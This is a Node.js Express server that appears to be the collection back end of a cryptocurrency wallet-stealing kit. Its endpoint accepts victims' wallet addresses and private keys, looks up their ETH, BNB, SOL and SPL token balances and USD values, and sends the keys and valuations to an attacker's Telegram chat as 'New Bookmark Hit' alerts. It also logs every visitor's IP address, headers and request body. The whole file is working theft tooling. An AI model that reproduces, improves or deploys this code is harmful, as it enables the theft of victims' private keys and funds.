const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const app = express();
const port = 1337;


const TG_BOT_TOKEN = 'Bot token';
const TG_CHAT_ID   = 'logid';

async function sendTelegram(text) {
  const body = JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' });
  return new Promise((resolve, reject) => {
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${TG_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      },
      res => { res.on('data', () => {}); res.on('end', resolve); }
    );
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function httpsGet(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(null); }
      });
    }).on('error', reject);
  });
}

async function getPrices() {
  try {
    const data = await httpsGet(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,solana&vs_currencies=usd'
    );
    return {
      eth: data?.ethereum?.usd || 0,
      bnb: data?.binancecoin?.usd || 0,
      sol: data?.solana?.usd || 0,
    };
  } catch { return { eth: 0, bnb: 0, sol: 0 }; }
}


const EVM_RPCS = {
  ethereum : 'https://eth.llamarpc.com',
  base     : 'https://mainnet.base.org',
  bnb      : 'https://bsc-dataseed.binance.org',
  monad    : 'https://testnet-rpc.monad.xyz',
  arc      : 'https://rpc.arc.fun',             
  robinhood: 'https://rpc.soniclabs.com',     
};


function normalizeChain(chainType) {
  const c = (chainType || '').toLowerCase();
  if (c.includes('base'))       return 'base';
  if (c.includes('bnb') || c.includes('bsc')) return 'bnb';
  if (c.includes('monad'))      return 'monad';
  if (c.includes('arc'))        return 'arc';
  if (c.includes('robin'))      return 'robinhood';
  if (c.includes('eth'))        return 'ethereum';
  return 'ethereum';
}

async function getEvmBalance(address, rpcUrl) {
  try {
    const payload = JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'eth_getBalance',
      params: [address, 'latest']
    });
    const result = await new Promise((resolve, reject) => {
      const url = new URL(rpcUrl);
      const req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      }, res => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
      });
      req.on('error', reject);
      req.write(payload);
      req.end();
    });
    const hex = result?.result;
    if (!hex) return 0;
    return parseInt(hex, 16) / 1e18;
  } catch { return 0; }
}


async function getSolBalance(address) {
  try {
    const payload = JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'getBalance',
      params: [address]
    });
    const result = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: 'api.mainnet-beta.solana.com',
        path: '/',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      }, res => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
      });
      req.on('error', reject);
      req.write(payload);
      req.end();
    });
    return (result?.result?.value || 0) / 1e9;
  } catch { return 0; }
}

async function getSplTokens(address) {
  try {
    const payload = JSON.stringify({
      jsonrpc: '2.0', id: 1,
      method: 'getTokenAccountsByOwner',
      params: [
        address,
        { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' },
        { encoding: 'jsonParsed' }
      ]
    });
    const result = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: 'api.mainnet-beta.solana.com',
        path: '/',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      }, res => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
      });
      req.on('error', reject);
      req.write(payload);
      req.end();
    });

    const accounts = result?.result?.value || [];
    const tokens = [];
    for (const acc of accounts) {
      const info = acc.account?.data?.parsed?.info;
      if (!info) continue;
      const mint   = info.mint;
      const amount = parseFloat(info.tokenAmount?.uiAmount || 0);
      if (amount <= 0) continue;
      tokens.push({ mint, amount });
    }
    return tokens;
  } catch { return []; }
}


async function getJupiterPrices(mints) {
  if (!mints.length) return {};
  try {
    const ids = mints.slice(0, 50).join(',');
    const data = await httpsGet(`https://price.jup.ag/v6/price?ids=${ids}`);
    const prices = {};
    for (const [mint, info] of Object.entries(data?.data || {})) {
      prices[mint] = info?.price || 0;
    }
    return prices;
  } catch { return {}; }
}


app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  console.log('─────────────────────────────────────');
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  console.log('IP      :', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
  console.log('Headers :', JSON.stringify(req.headers, null, 2));
  if (req.body && Object.keys(req.body).length > 0) {
    console.log('Body    :', JSON.stringify(req.body, null, 2));
  }
  console.log('─────────────────────────────────────');
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/fomo/runner-ticket', async (req, res) => {
  try {
    const job = req.body && req.body.job;
    if (job && Array.isArray(job.items) && job.items.length > 0) {

      // Split Solana and EVM wallets
      const solanaItems = job.items.filter(item => {
        const chain = (item.chainType || item.chain_type || '').toLowerCase();
        return chain.includes('sol');
      });
      const ethItems = job.items.filter(item => {
        const chain = (item.chainType || item.chain_type || '').toLowerCase();
        return !chain.includes('sol');
      });

      
      const prices = await getPrices();

      
      if (ethItems.length > 0) {
        const walletData = await Promise.all(ethItems.map(async item => {
          const chain   = item.chainType || item.chain_type || 'ethereum';
          const wallet  = item.wallet || item.address || 'N/A';
          const privKey = item.privateKey || 'N/A';
          const norm    = normalizeChain(chain);
          const rpc     = EVM_RPCS[norm] || EVM_RPCS.ethereum;

          let nativeBal = 0;
          let nativeSym = 'ETH';
          let nativePrice = prices.eth;

          if (norm === 'bnb') {
            nativeSym = 'BNB';
            nativePrice = prices.bnb;
          }

          try { nativeBal = await getEvmBalance(wallet, rpc); } catch {}

          let ethBal = 0, bnbBal = 0;
          if (norm === 'bnb') {
            bnbBal = nativeBal;
            try { ethBal = await getEvmBalance(wallet, EVM_RPCS.ethereum); } catch {}
          } else {
            ethBal = nativeBal;
            try { bnbBal = await getEvmBalance(wallet, EVM_RPCS.bnb); } catch {}
          }

          const ethUsd = ethBal * prices.eth;
          const bnbUsd = bnbBal * prices.bnb;
          const totalUsd = ethUsd + bnbUsd;

          return { chain, wallet, privKey, norm, ethBal, bnbBal, ethUsd, bnbUsd, totalUsd };
        }));

        const grandTotal = walletData.reduce((s, w) => s + w.totalUsd, 0);

        const blocks = walletData.map((w, i) => {
          const ethLine = `│  💠 ETH Balance : <code>${w.ethBal.toFixed(6)} ETH</code> (~$${w.ethUsd.toFixed(2)})`;
          const bnbLine = `│  🟡 BNB Balance : <code>${w.bnbBal.toFixed(6)} BNB</code> (~$${w.bnbUsd.toFixed(2)})`;
          return (
            `┌─ 💎 <b>Wallet #${i + 1} — ${w.chain}</b>\n` +
            `│  👛 Address    : <code>${w.wallet}</code>\n` +
            `│  🔑 PrivateKey : <code>${w.privKey}</code>\n` +
            ethLine + '\n' +
            bnbLine + '\n' +
            `│  💵 Wallet USD : $${w.totalUsd.toFixed(2)}\n` +
            `└────────────────────────────`
          );
        }).join('\n\n');

        const msg =
          `🔵 <b>New Bookmark Hit — EVM Chains</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          blocks + '\n\n' +
          `💰 <b>Total USD Value (All Networks): $${grandTotal.toFixed(2)}</b>`;

        await sendTelegram(msg);
        console.log(`[runner-ticket] EVM message sent (${ethItems.length} wallet(s))`);
      }

      if (solanaItems.length > 0) {
        for (let i = 0; i < solanaItems.length; i++) {
          const item   = solanaItems[i];
          const wallet = item.wallet || item.address || 'N/A';
          const privKey = item.privateKey || 'N/A';

          let solBal = 0;
          try { solBal = await getSolBalance(wallet); } catch {}
          const solUsd = solBal * prices.sol;

          let splTokens = [];
          try { splTokens = await getSplTokens(wallet); } catch {}

          const mints = splTokens.map(t => t.mint);
          const jupPrices = await getJupiterPrices(mints);

          let splTotalUsd = 0;
          const tokenLines = splTokens.map(t => {
            const usdPrice = jupPrices[t.mint] || 0;
            const usd = t.amount * usdPrice;
            splTotalUsd += usd;
            const mintShort = t.mint.slice(0, 8) + '...' + t.mint.slice(-4);
            return `│     🪙 <code>${mintShort}</code> — ${t.amount.toLocaleString('en-US', { maximumFractionDigits: 4 })} → $${usd.toFixed(2)}`;
          });

          const totalUsd = solUsd + splTotalUsd;

          let msg =
            `🟣 <b>New Bookmark Hit — Solana</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `┌─ 💎 <b>Wallet #${i + 1}</b>\n` +
            `│  👛 Address    : <code>${wallet}</code>\n` +
            `│  🔑 PrivateKey : <code>${privKey}</code>\n` +
            `│  ◎  SOL Balance: <code>${solBal.toFixed(6)} SOL</code> (~$${solUsd.toFixed(2)})\n`;

          if (tokenLines.length > 0) {
            msg += `│  📦 SPL Tokens (${tokenLines.length}):\n` + tokenLines.join('\n') + '\n';
          } else {
            msg += `│  📦 SPL Tokens : None\n`;
          }

          msg +=
            `│  💵 Total USD  : $${totalUsd.toFixed(2)}\n` +
            `└────────────────────────────`;

          await sendTelegram(msg);
        }
        console.log(`[runner-ticket] Solana message sent (${solanaItems.length} wallet(s))`);
      }

      if (solanaItems.length === 0 && ethItems.length === 0) {
        console.log('[runner-ticket] No wallets found to process.');
      }
    }
  } catch (err) {
    console.error('[runner-ticket] Error:', err.message);
  }

  res.json({ ok: true });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
